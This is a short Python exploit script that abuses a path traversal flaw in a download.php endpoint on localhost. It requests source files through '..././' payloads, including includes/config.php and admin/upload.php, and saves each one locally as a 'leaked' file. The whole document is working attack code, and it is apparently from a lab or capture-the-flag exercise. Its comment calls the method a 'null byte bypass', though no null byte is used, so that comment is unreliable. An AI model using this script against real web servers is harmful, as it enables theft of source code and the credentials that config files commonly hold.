#!/usr/bin/env python3
import requests
import urllib.parse

def download_source(filename):
    url = "http://localhost:8080/download.php"
    # null byte bypass
    payload = f"..././{filename}"
    
    r = requests.get(url, params={'file': payload})
    if r.status_code == 200:
        print(f"[+] Successfully downloaded {filename}:")
        print(r.text)
        # Save to file
        with open(f"leaked_{filename.split('/')[-1]}", "w") as f:
            f.write(r.text)
    else:
        print(f"[-] Failed to download {filename}")

if __name__ == "__main__":
    # Download important source files
    files = [
        "search.php",
        "includes/config.php",
        "includes/header.php",
        "admin/upload.php"
    ]
    
    for file in files:
        download_source(file) 